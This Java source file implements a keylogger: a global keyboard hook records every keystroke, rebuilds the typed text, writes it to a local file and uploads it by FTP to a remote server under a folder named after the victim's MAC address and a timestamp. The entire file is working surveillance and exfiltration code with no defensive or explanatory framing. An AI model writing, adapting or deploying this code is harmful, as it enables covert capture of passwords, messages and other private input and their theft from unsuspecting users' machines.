package Previous;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.swing.text.html.parser.Parser;
import java.io.*;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.time.LocalDateTime;
import java.util.Date;

public class NativeKeyBoard implements NativeKeyListener {

    public static String captured = "";
    public static String data_convert = "";
    public static String remoteFilePath = "/";
    public void nativeKeyPressed(NativeKeyEvent e) {
        //Gets the keycode of the key that was pressed
        String keyStroke = NativeKeyEvent.getKeyText(e.getKeyCode());
//        System.out.println(keyStroke);
        if (keyStroke.length() > 1) {
            captured = captured + "\n" + "Modifier Key Pressed: " + keyStroke + "\n";
            if(keyStroke.equals("Space")){
                data_convert+= " ";
            }else if(keyStroke.equals("Backspace")){
                System.out.println("Backspace");
                data_convert = (data_convert.length() != 0) ? data_convert.substring(0, data_convert.length()-1) : "";
            }else if(keyStroke.equals("Enter")){
                data_convert += "\n";
            }else if(keyStroke.equals("Tab")){
                data_convert += "\t";
            }
        }
        else {
            captured += keyStroke;
            data_convert += keyStroke;
        }
        System.out.println("Data input :    " +captured);
        System.out.println("\n");
        System.out.println("Data Convert  : " +data_convert);
        System.out.println("-------------------------------------------");
    }

    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    	
    }

    public void onSave(FTPClient ftp) throws IOException {
        Date time = new Date();

        File file = new File("Typping_Data.txt");
        String localFilePath = file.getAbsolutePath();
        localFilePath = localFilePath.replace('\\', '/');
        System.out.println(localFilePath);
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd-M-yyyy hh:mm:ss");
        String date = dateFormat.format(time);
        date = date.replace(" ", "-T-");
        date = date.replace(":","-");
        System.out.println(date);

        //  Get MAC ADDRESS
        InetAddress ip_local = InetAddress.getLocalHost();
        NetworkInterface network = NetworkInterface.getByInetAddress(ip_local);

        byte[] mac = network.getHardwareAddress();
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < mac.length; i++) {
            sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
        }
        remoteFilePath += sb;
        ftp.makeDirectory(remoteFilePath);

        remoteFilePath += "/" + date;


        ftp.makeDirectory(remoteFilePath);
        remoteFilePath = remoteFilePath + "/"  + file.getName();
        try (PrintWriter out = new PrintWriter(file, "UTF-8")) {
            out.write("Character from keyboard :    \n");
            out.write(captured);
            out.write("\n------------------------------------\n");
            out.write("Data get  :    \n");
            out.write(data_convert);
            captured = "";
            data_convert = "";

        } catch (FileNotFoundException | UnsupportedEncodingException e1) {
            e1.printStackTrace();
        }
        uploadSingleFile(ftp, localFilePath, remoteFilePath);
        System.out.println("Data has been save to Server at : " + remoteFilePath);
        System.out.println("-----------------------------------------");
        remoteFilePath = "/";
    }

    public static boolean uploadSingleFile(FTPClient ftpClient,
                                           String localFilePath, String remoteFilePath) throws IOException {
        File localFile = new File(localFilePath);
//        System.out.println("Remote" + remoteFilePath);
//        System.out.println("local" + localFilePath);
        InputStream inputStream = new FileInputStream(localFile);
//        System.out.println("RemoFile : " + remoteFilePath);
//        System.out.println("LocalFile Stream  :  " +localFile);
        try {
            ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
            return ftpClient.storeFile(remoteFilePath, inputStream);
        } finally {
            inputStream.close();
        }
    }
}
